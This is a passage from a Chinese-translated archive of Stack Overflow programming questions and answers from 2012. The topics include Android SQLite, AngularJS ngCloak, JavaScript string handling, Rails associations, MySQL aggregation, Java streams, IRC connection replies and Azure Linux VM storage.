        users.add(new User(c.getLong(c.getColumnIndex(USER_COLUMN_USERID)),
                c.getString(c.getColumnIndex(USER_COLUMN_USERNAME))));
        c.moveToNext();
    }

    return users;
}

public Cursor getAllItems() {
    Cursor c = db.query(TABLE_ITEM, new String[] { ITEM_COLUMN_ID,
            ITEM_COLUMN_TEXT, ITEM_COLUMN_TIMESTAMP, ITEM_COLUMN_TYPE,
            ITEM_COLUMN_URL, ITEM_COLUMN_IMGURL, ITEM_COLUMN_USER_ID },
            null, null, null, null, null);
    // db.close();
    return c;
}

public long getItemTableSize() {
    SQLiteDatabase database = this.getReadableDatabase();
    long l = DatabaseUtils.queryNumEntries(database, TABLE_ITEM);
    // database.close();
    return l;
}

public void clearItemTable() {
    db.delete(TABLE_ITEM, null, null);
}

public void clearUserTable() {
    db.delete(TABLE_USER, null, null);
}

public void clearFeeds() {
    db.delete(TABLE_FEED, null, null);
    db.delete(TABLE_FEEDUSER, null, null);
}

public void addUsers(List<? extends User> users) {
    db.beginTransaction();

    for (User u : users) {
        ContentValues temp = new ContentValues();
        temp.put(USER_COLUMN_USERNAME, u.getUserName());
        temp.put(USER_COLUMN_USERID, u.getId());
        temp.put(USER_COLUMN_SOURCE, u.getSource());
        db.insertWithOnConflict(TABLE_USER, null, temp, SQLiteDatabase.CONFLICT_IGNORE);
    }
    db.setTransactionSuccessful();
    db.endTransaction();
}

public Cursor getAllUsers() {
    Cursor c = db.query(TABLE_USER, new String[] { USER_COLUMN_ID,
            USER_COLUMN_USERNAME, USER_COLUMN_USERID }, null, null, null,
            null, null);
    return c;
}

public Cursor getItems(Feed feed) {
    Cursor c = db.rawQuery("SELECT * FROM " + TABLE_ITEM 
            + " WHERE " + ITEM_COLUMN_USER_ID 
            + " IN (SELECT " + FEEDUSER_COLUMN_USER_ID 
            + " FROM " + TABLE_FEEDUSER
            + " WHERE " + FEEDUSER_COLUMN_FEED_ID 
            + " = " + getFeedID(feed)
            + ") ORDER BY " + ITEM_COLUMN_TIMESTAMP + " DESC", null);
    return c;
} 
```

}

最好的问候拉瓦

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:21:46.383

[考虑用对象关系映射器](http://en.wikipedia.org/wiki/List_of_object-relational_mapping_software)替换您手工制作的 JBDC 代码

请参阅：[Android SQLite 和数据库方案上的 ORM](https://stackoverflow.com/questions/2973982/orm-on-android-sqlite-and-database-scheme)

# angularjs - 防止双花括号符号在 angular.js 编译/插入文档之前暂时显示

> ID：12866447
> 
> 赞同：298
> 
> 时间：2012-10-12T20:14:46.197
> 
> 标签：angularjs

当有许多图像/脚本要加载时，这似乎主要是 IE 中的一个问题，可能有很长一段时间`{{stringExpression}}`会显示标记中的文字，然后在 Angular 完成编译/插值后消失文件。

是否有一个常见的原因会发生这种情况，这表明我做错了什么，或者是否有已知的方法可以防止这种情况发生？

* * *

## 回答 #1

> 赞同：284
> 
> 时间：2012-10-12T20:38:23.033

我认为您正在寻找`ngCloak`指令：[https ://docs.angularjs.org/api/ng/directive/ngCloak](https://docs.angularjs.org/api/ng/directive/ngCloak)

从文档中：

> ngCloak 指令用于防止 Angular html 模板在加载应用程序时被浏览器以原始（未编译）形式短暂显示。使用该指令可以避免 html 模板显示引起的不良闪烁效果。
> 
> 该指令可以应用于`<body>`元素，但首选用法是将多个`ngCloak` 指令应用于页面的一小部分，以允许渐进式呈现浏览器视图

* * *

## 回答 #2

> 赞同：200
> 
> 时间：2012-10-12T20:49:19.220

此外，您可以使用`<span ng-bind="hello"></span>`而不是`{{hello}}`.

[http://jsfiddle.net/4LhN9/34/](http://jsfiddle.net/4LhN9/34/)

* * *

## 回答 #3

> 赞同：51
> 
> 时间：2013-07-28T08:30:59.710

为了提高最后加载脚本时 class='ng-cloak' 方法的有效性，请确保在文档头部加载以下 css：

```
.ng-cloak { display:none; } 
```

* * *

## 回答 #4

> 赞同：40
> 
> 时间：2014-06-06T04:40:50.227

只需将隐藏的 CSS 添加到页面头部或您的 CSS 文件之一：

```
[ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak, .ng-hide {
    display: none !important;
} 
```

然后你可以按照正常的 Angular 实践使用[ngCloak 指令](https://docs.angularjs.org/api/ng/directive/ngCloak)，它甚至可以在 Angular 本身加载之前工作。

这正是 Angular 所做的：angular.js 末尾的代码将上述 CSS 规则添加到页面头部。

* * *

## 回答 #5

> 赞同：21
> 
> 时间：2015-02-05T05:12:26.857

在您的 CSS 中添加以下内容

```
[ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak {
    display: none !important;
 } 
```

然后在你的代码中你可以添加 ng-cloak 指令。例如，

```
<div ng-cloak>
   Welcome {{data.name}}
</div> 
```

而已！

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2015-11-07T19:24:55.653

您也可以使用`ng-attr-src="{{variable}}"`代替，`src="{{variable}}"`并且只有在编译器编译模板后才会生成该属性。这在文档中提到：[https ://docs.angularjs.org/guide/directive#-ngattr-attribute-bindings](https://docs.angularjs.org/guide/directive#-ngattr-attribute-bindings)

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2016-12-27T10:54:06.843

我同意@pkozlowski.opensource 的回答，但 ng-clock 类不适用于我与 ng-repeat 一起使用。所以我想推荐你使用简单的分隔符表达式类，比如 {{name}} 和 ng-repeat 的 ngCloak 指令。

```
<div class="ng-cloak">{{name}}<div> 
```

和

```
<li ng-repeat="item in items" ng-cloak>{{item.name}}<li> 
```

# eclipse - 为什么 Eclipse 可能无法在 Ant 构建文件的运行选项中显示“Ant Build”？

> ID：12866455
> 
> 赞同：15
> 
> 时间：2012-10-12T20:15:06.540
> 
> 标签：eclipse, ant

通常，当我在 Eclipse 包资源管理器中右键单击 Ant 构建文件并从上下文菜单中选择“Run As”时，我会看到“Ant Build”和“Ant Build...”选项可供选择。这是正确的行为。

有时，这些选项会被与 Ant 无关的选项所取代，例如“JUnit 测试”和“Java 小程序”。什么会导致 Eclipse 失去其上下文敏感性并且不在那里显示正确的选项？我该如何解决？

我在 Windows XP 和 Windows 7 上的多个 Eclipse 版本中都看到了这一点。文件是否命名似乎并不重要`build.xml`。无论是否发生此错误，构建文件都会在 Package Explorer 中显示为带有 Ant 图标，而不是通用 XML 文件图标。即使发生奇怪的行为，运行构建的替代方法也可以工作，例如通过“运行”菜单或打开文件并右键单击编辑器。

到目前为止，我能找到的唯一“解决方案”是不断重启 Eclipse，直到它再次开始工作，这只是把罐子踢下去，实际上并没有解决任何问题。

编辑：
我现在偶尔会遇到 Maven POM 的上下文菜单实例，它在“运行方式”下显示 Ant 构建选项。也许“不正确的'运行方式'选项”是一个更广泛的 Eclipse 问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-03-24T15:50:04.017

在 Eclipse 插件开发人员的上下文中，所有此类弹出菜单、菜单和工具栏操作都称为命令/操作集。这些元素有它们的visible-when 和 enable-when 检查以在需要的条件下显示它们。条件包括所需的主动视角、主动视图、需要选择和选择的有效性。大多数情况下，未显示的选项是由于实际预期行为的条件失败。所有这些条件都应该通过在文档中直接或间接提及这些条件来记录。如果任何条件没有正确实现，我们总是可以在[Bugzilla](https://bugs.eclipse.org/bugs/)中向 eclipse 社区提出错误。在提出错误之前，应该检查类似的现有错误是否已经存在。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-07T12:37:35.250

作为一种解决方法，您可以将 ant 脚本添加到 Ant 视图中。从那里找到脚本比从包资源管理器中更容易找到，您甚至可以轻松地执行除默认目标之外的其他目标。

# javascript - 如何在 JavaScript 中转义反斜杠？

> ID：12866461
> 
> 赞同：15
> 
> 时间：2012-10-12T20:15:43.887
> 
> 标签：javascript, regex

我想用安全`&#92;`替换替换反斜杠 => '\'。

但是我的代码在申请替换'\'时替换所有'#'失败：

```
el = el.replace(/\#/g, '&#35;'); // replaces all '#' //that's cool
el = el.replace(/\\/g, '&#92;'); // replaces all '\' //that's failing 
```

为什么？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-10-15T21:03:01.553

打开控制台并输入

```
'\'.replace(/\\/g, '&#92;'); 
```

失败，因为字符串中的斜杠实际上不在字符串中，它正在转义 '

```
'\\'.replace(/\\/g, '&#92;'); 
```

有效，因为它需要一个斜线并找到它。

你的正则表达式有效。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-05-10T10:30:23.000

您可以使用[String.raw](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/raw)在字符串文字中方便地添加斜杠。例如`String.raw`\a\bcd\e`.replace(/\\/g, '&#92;');`

# javascript - 屏蔽文本，但仍允许用户复制它

> ID：12866468
> 
> 赞同：2
> 
> 时间：2012-10-12T20:16:17.720
> 
> 标签：javascript, html, css

我正在向我的用户发送敏感信息，我希望他们能够复制（用于粘贴到其他地方）但不能直接看到。

我考虑过几种方法，但我都坚持了下来。

1.  用数据填充密码框，但这不允许他们复制文本。

2.  使文本颜色与背景颜色相同。但是，恐怕我的用户甚至都不知道有要复制的文本。他们只会坐在那里说“我没有看到任何文字！” 即使我确实非常明确地指出了他们应该做什么，那么文本在被选中时仍然是可见的。

3.  创建某种 on_copy 事件，该事件将在用户复制星号时传递文本。我知道如何使用 jQuery 的 bind() 来检测副本，但我还没有找到改变实际复制内容的方法。

4.  最后也是最不重要的：javascript 和剪贴板管理的一些花哨的东西。我真的不想去那里，因为它需要闪光灯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:35:36.833

这个怎么样......你制作一个`div`或`input`包含“隐藏”文本`opacity 0.001`，`focus()`它并通过javascript设置它对整个内容（应该是你希望该人复制的文本）的选择，并以某种方式通知用户`Ctrl+C`按下复制数据（可能使用类似 javascript 的弹出式事件，该事件会在那里停留几秒钟以供用户阅读）。

# ruby-on-rails - 将 self.id 关联到 rails 中的嵌套模型 before_create

> ID：12866471
> 
> 赞同：1
> 
> 时间：2012-10-12T20:16:23.873
> 
> 标签：ruby-on-rails, ruby, many-to-many, polymorphic-associations, rails-models

我的模型和关联目前设置如下：

```
class User < ActiveRecord::Base
  has_and_belongs_to_many :projects
  has_many :versions, :through => :projects
end

class Projects < ActiveRecord::Base
  has_many :versions
end

class Version < ActiveRecord::Base
  belongs_to :project
  attr_accessible :user_id, :project_id
  before_create :associate_user

 def associate_user
  # I have no idea what to do here - in fact, I don't think this is even the right place to do this!
 end
end 
```

当我执行类似`user.projects.first.versions.create`的操作时，我希望`user_id`字段中`Version`填写`user_id`创建模型的用户的 。现在，当我执行该创建方法时，它被设置为 nil。现在，这是有道理的，我明白*为什么*它不起作用。我只是不知道如何使这项工作。

我一直在为此挠头，无法弄清楚！你将如何做到这一点？

**更新**

*注意：虽然这行得通，但下面的 Levi 的回答是一个更好的解决方案，这也是我最终选择的*

我想通了，但我仍然希望得到有关这是否是解决此问题的最佳方法的反馈。我觉得可能有一个内置的rails方法可以做到这一点，我错过了

这是我更新的`Version`模型：

```
class Version < ActiveRecord::Base
belongs_to :production
attr_accessible :user_id, :production_id

after_create :associate_user

def associate_user
    @users = User.all(:include => :productions, :conditions => {"productions_users.production_id" => self.production_id})
    @users.each do |user|
        user.productions.each do |production|
            if production.versions.exists?(self)
                @version_user = user
            end
        end
    end
    self.user_id = @version_user.id
 end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:59:58.203

当您创建版本时，我只会传入 id。

```
user.projects.first.version.create(:user_id => user.id) 
```

这样你根本不需要`before_create`回调。

**编辑：**

您可能还需要考虑您的数据库结构。您的版本表上有一个 project_id 和一个 user_id。您还拥有`projects_users`具有相同键的连接表 ( )。为什么不把它变成一个真实的模型并`belongs_to :user_project`在版本模型中添加一个（或任何合适的）？这是从版本到项目的额外连接，但数据模型更有意义。

```
class User < ActiveRecord::Base
  has_many :user_projects
  has_many :projects, :through => :user_projects
  has_many :versions, :through => :projects
end

class UserProject < ActiveRecord::Base
  belongs_to :user
  belongs_to :project
  has_many :versions
end

class Projects < ActiveRecord::Base
  has_many :versions
  has_many :user_projects
  has_many :users, :through => :user_projects
end

class Version < ActiveRecord::Base
  belongs_to :user_project
end 
```

# php - MySQL将字段结果乘以另一个字段的数量

> ID：12866473
> 
> 赞同：1
> 
> 时间：2012-10-12T20:16:31.860
> 
> 标签：php, mysql, sql, mysqli

我正在从我的数据库中选择各种列，我的查询如下所示：

```
SELECT st.* , u.username creator, COUNT(DISTINCT se.sentenceid) AS sentences,
  COALESCE(SUM(v.vote), 0) score, 
  GROUP_CONCAT(se.text ORDER BY se.sentenceid SEPARATOR  ' ') text
FROM stories st
JOIN sentences se ON st.storyid = se.storyid
LEFT OUTER JOIN votes v ON st.storyid = v.storyid
LEFT OUTER JOIN users u ON st.creatorid = u.userid
GROUP BY st.storyid
LIMIT 30 
```

此查询适用于除分数之外的所有内容。输出分数是句子数乘以实际分数。我的`votes`表如下所示：

```
+---------+------------+------+-----+---------+-------+
| Field   | Type       | Null | Key | Default | Extra |
+---------+------------+------+-----+---------+-------+
| userid  | int(11)    | YES  | MUL | NULL    |       |
| storyid | int(11)    | NO   | MUL | NULL    |       |
| vote    | tinyint(4) | NO   |     | NULL    |       |
+---------+------------+------+-----+---------+-------+ 
```

`vote`包含值 1 或 -1。

* * *

我将如何修改我的查询以接收实际分数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:28:53.677

```
SELECT st.* , u.username creator, COUNT(DISTINCT se.sentenceid) AS sentences,
  COALESCE((SELECT SUM(v.vote)
            FROM votes v
            WHERE st.storyid = v.storyid), 0) score, 
  GROUP_CONCAT(se.text ORDER BY se.sentenceid SEPARATOR  ' ') text
FROM stories st
JOIN sentences se ON st.storyid = se.storyid
LEFT OUTER JOIN users u ON st.creatorid = u.userid
GROUP BY st.storyid
LIMIT 30 
```

因为每个故事都可以有很多句子和很多选票，所以通过将所有可能的连接相乘，您将得到一个笛卡尔积。

# c# - 替换列表中每个字符串的空格

> ID：12866474
> 
> 赞同：2
> 
> 时间：2012-10-12T20:16:31.880
> 
> 标签：c#

我正在尝试用下划线重命名每个文件的空白区域：

```
DirectoryInfo dir = new DirectoryInfo(@"Q:\Audio");
var files = (from f in dir.GetFiles() select f.FullName);
files.ToList().ConvertAll( s => s.Replace( " ", "_") ); 
```

但它不起作用，我尝试使用 foreach 循环并抱怨“无法分配给'元素'，因为它是'foreach 迭代变量'”

我该如何处理？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T20:20:00.917

`ConvertAll`返回一个新的`List`.

```
var renamedFiles = files.ToList().ConvertAll(s => s.Replace(" ", "_")); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:26:04.317

您可以使用以下代码块之一：

```
DirectoryInfo dir = new DirectoryInfo(@"C:\");
var files = (from f in dir.GetFiles() select f.FullName.Replace(" ", "_")); 
```

或者：

```
DirectoryInfo dir = new DirectoryInfo(@"C:\");
var files = (from f in dir.GetFiles() select f.FullName);
var fileNames = (from fn in files select fn.Replace(" ", "_")); 
```

或者：

```
DirectoryInfo dir = new DirectoryInfo(@"C:\");
var files = (from f in dir.GetFiles() select f.FullName);
var fileNames = files.Select(s => s.Replace(" ", "_")); 
```

或（坏主意）：

```
DirectoryInfo dir = new DirectoryInfo(@"C:\");
var files = (from f in dir.GetFiles() select f.FullName);
var fileNames = files.ToList().ConvertAll(s => s.Replace(" ", "_")); 
```

编辑 1：但我建议使用 select 函数，最好不要为 IQueryable 等延迟对象调用 .ToList() 方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:20:10.057

你实际上需要重置你的变量`files`。`files`更改最后一行以使用来自的输出重置变量`ConvertAll`。

```
files = files.ToList().ConvertAll( s => s.Replace( " ", "_") ); 
```

# android - 授权facebook权限后facebook不打开

> ID：12866475
> 
> 赞同：2
> 
> 时间：2012-10-12T20:16:33.277
> 
> 标签：android, facebook

我遵循 API facebook 指南，代码如下：

```
ib2 = (ImageButton) findViewById(R.id.imageButton2);

    list = new OnClickListener() {

        public void onClick(View v) {

             /*
             * Get existing access_token if any
             */
            mPrefs = getPreferences(MODE_PRIVATE);
            String access_token = mPrefs.getString("access_token", null);
            long expires = mPrefs.getLong("access_expires", 0);
            if(access_token != null) {
                facebook.setAccessToken(access_token);
            }
            if(expires != 0) {
                facebook.setAccessExpires(expires);
            }

            /*
             * Only call authorize if the access_token has expired.
             */
            if(!facebook.isSessionValid()) {

                facebook.authorize(Answer.this, new String[] {"user_about_me","publish_checkins"}, new DialogListener() {
                    public void onComplete(Bundle values) {
                        SharedPreferences.Editor editor = mPrefs.edit();
                        editor.putString("access_token", facebook.getAccessToken());
                        editor.putLong("access_expires", facebook.getAccessExpires());
                        editor.commit();
                    }

                    public void onFacebookError(FacebookError error) {}

                    public void onError(DialogError e) {}

                    public void onCancel() {}
                });
            }
    }};

    ib2.setOnClickListener(list); 
```

和

```
@Override
public void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    facebook.authorizeCallback(requestCode, resultCode, data);
} 
```

每一个都在正确的位置与正确的声明。和...

第一次在按钮上执行 Onclick 时，facebook 要求我接受我的应用程序所需的权限。

但...

我第二次在同一个按钮上单击时，facebook 窗口没有打开。为什么会这样？

如果我设置了权限，我应该看到授权OK！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T22:31:10.047

您是否安装了官方 Facebook 应用程序？因为如果你这样做，这是一个错误，我相信他们仍然没有修复。

我不知道这是否是问题所在，但您可以尝试强制对话框：`facebook.authorize(Answer.this, new String[] {"user_about_me","publish_checkins"}, Facebook.FORCE_DIALOG_AUTH, new DialogListener() {`

我不太明白你在这里遇到什么，所以请告诉我它是如何工作的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-15T15:05:46.753

```
"The first time doing Onclick on the button, facebook ask me to accept the permissions     required for my app." 
```

在这种情况下，由于这是您第一次使用 Facebook 登录应用程序，您的应用程序没有访问令牌并过期

facebook.isSessionValid()=false

-->facebook.authorize() 将运行

Facebook 会请求您的许可（因为您的 Facebook 帐户以前从未允许您的应用程序）

但第二次，

访问令牌和过期时间已保存到 sharepreference，==>facebook.isSessionValid() 为 true，

==>facebook.authorize() 不会运行

==>似乎已登录

所以facebook窗口不会弹出。

如果您想再次看到 facebook 弹出窗口，

1) 清理应用的缓存

2）终止应用程序（sharepreference中的访问令牌将被清除）

然后你可以看到一个facebook登录窗口弹出，但你不会看到premission页面，因为你已经允许你的应用程序（只需要允许一次）

如果您想再次查看facebook权限页面，只需转到您的Facebook，进入隐私设置->广告、应用程序和网站->按编辑设置并取消您的APP授权。然后 Premission 页面将再次弹出，以便您下次登录该应用程序

# javascript - 在javascript中删除给定字符串的第一个字符的最佳方法

> ID：12866477
> 
> 赞同：2
> 
> 时间：2012-10-12T20:16:39.753
> 
> 标签：javascript, jquery, underscore.js

使用`jquery`或`underscore`pure`javascript`删除给定字符串的第一个字符的最佳方法是什么？

我会做这样的事情：

```
"aamerica".substring(1,"aamerica".length);

"aamerica".slice(1); 
```

使用切片或子字符串更好吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-12T20:19:22.417

你实际上会很好：

```
"aamerica".substring(1); 
```

**[例子](http://jsfiddle.net/zktGF/1/)**

[substring](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/substring)的第二个参数是可选的：

> string.substring(indexA[, indexB])

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-12T20:19:29.947

```
"aamerica".substring(1); 
```

你`"aamerica".length;` [是不必要的](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/substring)

引用文档：

> string.substring(indexA[, indexB])
> 
> 如果省略 indexB，则 substring 将字符提取到字符串的末尾。

您总共有 3 个选项：

*   `"aamerica".substring(1);`
*   `"aamerica".slice(1);`
*   `"aamerica".substr(1);`

这三种方法都具有[相同的性能](http://jsperf.com/substring-extraction-methods-substring-substr-slice)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T20:20:21.030

您可以使用切片：`"aamerica".slice(1);`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:21:58.470

你不能比现在做得更好。

但是，当您希望子字符串到达​​字符串末尾时，您可以省略第二个参数。

`var s = "aamerica".substring(1);`

# java - Java IO——关闭输入流

> ID：12866479
> 
> 赞同：2
> 
> 时间：2012-10-12T20:16:58.370
> 
> 标签：java, java-io

如果

```
FileInputStream fileIS = new FileInputStream(filePathStr);
DataInputStream dataIS = new DataInputStream(fileIS); 
```

**关闭 fileIS 会自动关闭 dataIS**，因为 dataIS 是传播 fileIS 还是应该单独关闭 dataIS？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T20:18:24.083

如果有选择，您应该只关闭`DataInputStream`. 更一般地说，总是关闭最外层的包装流。关闭将向内传播，这是通常确保正确行为的唯一方法。

但是，如果您关闭底层`FileInputStream`，这也足够了，因为`DataInputStream`它本身不会获取任何系统资源。

对您的问题最直接的回答：不，关闭底层流**不会**关闭包装流，但实际上从系统资源泄漏的角度来看，这无关紧要。只有底部的流与实际的系统资源耦合。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:19:38.757

应该做相反的事情。由于 DataInputStream 包装了 FileInputStream，因此您应该关闭它，这也会关闭 FileInputStream。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-12T20:22:37.207

该实现将负责关闭内部流。关闭最外面的流，否则在使用例如 BufferedOutputStream 时会出现问题，然后先关闭 OutputStream - 缓冲区中剩余的数据无法写入并丢失！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-13T01:15:40.193

DataInputStream 扩展了 FilterInputStream 本身并没有实现 close() ，所以它是继承的。您所询问的行为在 FilterInputStream.close() 的合同中明确指定，因此 DataInputStream 必须遵守，FilterInputStream 的所有其他派生类也必须遵守。对于 FilterOutputStream、FilterReader 和 FilterWriter 的派生类也是如此。

# python - IRC (rfc1459)：哪个事件表明我已连接？

> ID：12866480
> 
> 赞同：2
> 
> 时间：2012-10-12T20:16:58.650
> 
> 标签：python, irc

我即将实现`rfc1459`.

我的事情是：

我怎么知道我的脚本已正确连接到网络。我的意思是什么事件说你的“是的先生。你通过了我所有的检查，继续”

我目前正在检查是否出现消息“：欢迎”：3

```
if ':Welcome' in s:
        print 'Connection established...'
        self.send('JOIN %s\r\n' % self.channel) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T21:03:03.923

我真的想通了！

我的第一个问题是有一个更新 rfc1459 的 rfc：[rfc2812](https://www.rfc-editor.org/rfc/rfc2812)

你瞧，有一条欢迎消息 RPL_WELCOME。

这正是我想知道的！

- 蒂莫

# javascript - “跳跃” jquery 图像滑块导航

> ID：12866483
> 
> 赞同：0
> 
> 时间：2012-10-12T20:17:04.837
> 
> 标签：javascript, jquery

我正在使用缩略图作为导航的 jquery 图像滑块/插件。我注意到它们非常“跳跃”，因为当我第一次将鼠标悬停在图像上时，整个选择会前后移动。此外，当我将光标从缩略图上移开时，它们也会这样做。任何想法如何防止/减少这种情况？

[现场直播。](http://urbanpalate.com/instyle-mag-ming-by-mango/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:20:35.280

这是因为滑块基于鼠标位置，但缩略图仅在您将鼠标悬停在缩略图导航上时才会移动。所以当你离开导航时，将光标向左移动很长一段距离，然后将其放回导航上，它当然会跳跃很多。

a) 使用不同的滚动缩略图导航的方法，而不是基于鼠标位置

b）让缩略图导航一直滚动，无论您是否将鼠标悬停在它上面

# php - 将表单输入值传递给 URL

> ID：12866488
> 
> 赞同：2
> 
> 时间：2012-10-12T20:17:58.457
> 
> 标签：php, forms, hyperlink

这里是 HTML 的新手。

我正在寻找将输入的搜索词传递到 URL 字段的搜索框。

这是我的输入表单：

```
<form name="search" action="/search/" method="post">
    <input type="text" name="topic" value="">
</form> 
```

我希望搜索词`/search/`在 URL 之后。如何才能做到这一点？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:19:01.050

使用 GET 表单方法：

```
<form name="search" action="/search/" method="GET">
    <input type="text" name="topic" value="" />
</form> 
```

编辑：

要让表单将用户发送到 /search// 之类的 url，您可以使用这样的 javascript 函数：

```
function submitForm(){
    var url = '/search/';
    url += document.search.topic.value + '/';
    // repeat the above line for any other fields you may want to add
    window.location.href = url;
} 
```

然后，您可以将此函数用作`onClick`提交按钮或表单的处理程序`onSubmit`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:26:27.513

您可以删除 method="post" 因为默认是 GET 方法

# c++ - 控制台应用程序中的 QFileDialog::getOpenFileName

> ID：12866490
> 
> 赞同：0
> 
> 时间：2012-10-12T20:18:00.307
> 
> 标签：c++, qt, console-application, getopenfilename

这是第一次在[qtforum.org](http://www.qtforum.org)上发布的问题，我没有[得到答案](http://www.qtforum.org/article/38486/qfiledialog-getopenfilename-in-console-application.html#post120385)：

使用后，我无法在控制台应用程序中隐藏“打开”对话框。以下是用于测试此行为的 main.cc 文件的内容：

```
#include <QApplication>
#include <QFile>
#include <QFileDialog>
#include <QString>

bool b_closing = false;

static QString gofn ( void )
{
    QString    s_file;
    s_file = QFileDialog::getOpenFileName(
            qApp->activeWindow(),
            QObject::tr( "Select the file to open:" )
            );
    if ( !s_file.isEmpty() )
    {
        /* ... */
    }

    /* have no effect; */
    QApplication::processEvents();
    QApplication::sendPostedEvents();

    return s_file;
}

static void userInpLoop ( void )
{
    QFile    cons_inp;
    QFile    cons_outp;
    QString  s_ln;

    cons_inp.open( stdin, QIODevice::ReadOnly );
    cons_outp.open( stdout, QIODevice::WriteOnly );

    for ( ;; )
    {
        if ( b_closing )
            break;

        cons_outp.write( "\n>" );
        cons_outp.flush();
        s_ln = cons_inp.readLine().trimmed();

        if ( s_ln == "q" )
        {
            b_closing = true;
            cons_outp.write( "Closng...\n" );
        }
        else if ( s_ln == "gofn" )
        {
            cons_outp.write( gofn().toLatin1() );
        }
        else
        {
            cons_outp.write( "ERROR!!! \nInvalid input!\n" );
        }
        cons_outp.flush();
        //break; /* just to test that a.exec() hides the dialog */
    }

}

int main( int argc, char *argv[] )
{
    /* we choose QApplication instead of QCoreApplication because we need some Gui components */
    QApplication a(argc, argv);
    userInpLoop();
    //return a.exec(); /* this will hide the dialog */
    return 0;
} 
```

我使用这个 .pro 文件构建应用程序：

```
QT += core gui
TARGET = test_gofn
CONFIG += console
CONFIG -= app_bundle
TEMPLATE = app
SOURCES += main.cc 
```

操作系统：Ubuntu 12.04

Qt：从主干构建的 4.8.2

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T12:34:58.153

你可能想试试

```
QEventLoop loop; 
while (loop.processEvents()) 
    /* nothing */; 
```

我发现有时需要再次调用循环......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T21:43:13.907

在Windows 7上，使用Qt4.8.1和Qt4.8.3编译，openDialog很自然，使用后隐藏。

你能描述更多吗，你身边发生了什么？

# linux - 在 Azure Linux VM 中，什么会持续存在？什么磁盘收费？

> ID：12866493
> 
> 赞同：7
> 
> 时间：2012-10-12T20:18:04.737
> 
> 标签：linux, azure, virtual-machine

我在 Microsoft 的 Azure 中创建了一个小型 Linux VM。我还创建了一个 20GB 的 BLOB 并将其挂载为文件系统。

在我的虚拟机上，我看到以下内容：

*   根文件系统：约 28GB
*   引导文件系统：约 500MB
*   我的 20GB 文件系统
*   /mnt/资源 - 69GB

所以我有问题：

(1) 如果我关闭虚拟机电源然后再重新启动，这些文件系统/卷中的哪些将保持虚拟机关闭时的状态？每个卷都是这种情况（我测试过），但“它在测试中有效”与保证不同。

(2) 如果由于 Azure 环境中存在某种硬件故障或故障（“自愈迁移”）而需要移动 VM，那么哪些文件系统会持续存在？我怀疑root会，但不是/mnt/resource？

(3) 在azure管理门户中，我有一个30GB的磁盘，是我创建VM时创建的。该磁盘的成本是虚拟机每小时美分费用的一部分，还是单独收费？我认为是分开的。

(4) 假设小型 VM 带有 165GB 用于“VM 角色中本地存储资源的磁盘空间”：http: [//msdn.microsoft.com/en-us/library/windowsazure/ee814754.aspx](http://msdn.microsoft.com/en-us/library/windowsazure/ee814754.aspx) 我看到 69GB - 其中剩下的都走了吗？

您可能认为我可以向 Microsoft 提出这些问题，但当我这样做时，他们说 Linux VM 处于“预览”状态，并且他们的支持人员拒绝回答任何 Linux VM 问题，除非指向相当鬼魅般的 Azure 论坛。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-13T15:44:52.470

我还没有使用过 Linux 的 IaaS 实例，但我想我可以根据我对基础设施总体工作方式的理解来回答其中的一些问题。

当你创建一个虚拟机时，你有操作系统磁盘（它映射到你上面的根目录，我相信启动也是如此，尽管我认为这是一个基于 Linux 的工件并且在使用 Windows 时不存在）。此 OS 磁盘作为 VHD、Page BLOB 存储在 Windows Azure BLOB 存储中。与您创建的 20 GB 数据磁盘相同。这些驱动器将可靠地持续存在并且只有这些驱动器。

1）在您的断电测试中，您实际上是删除了部署还是只是“将其关闭”？关闭虚拟机将使其部署（因此在同一台物理机器上）。只是被关闭并不能阻止您被收费，因为它实际上仍在部署。如果您删除部署，然后稍后创建一个指向您创建的相同操作系统和数据磁盘的新部署（您将在您的图库中找到它们），您将更好地了解如果 VM 移动到期会发生什么自我修复，因为它很可能会在不同的物理服务器上启动。请参阅下面为什么我认为“资源”驱动器卡住了。

